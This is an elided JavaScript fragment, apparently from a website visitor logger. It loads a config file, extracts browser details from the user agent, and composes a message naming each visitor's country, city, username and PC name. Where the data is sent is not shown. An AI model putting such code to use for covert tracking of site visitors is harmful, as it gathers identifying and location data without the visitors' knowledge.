    ...
    await fetch("./config.json").then((response) => {
        ...
        return response.json().then(function (data) {
            ...
            const request = async () => {
                ...
                // Extract browser details from user agent
                const userAgent = AgentData.userAgent;
                const browserDetails = userAgent.split('(')[1].split(')')[0];
                ...
                const params = {
                    username: "Website Visited From " + country + "/" + city + " - " + username + " on " + pcName,
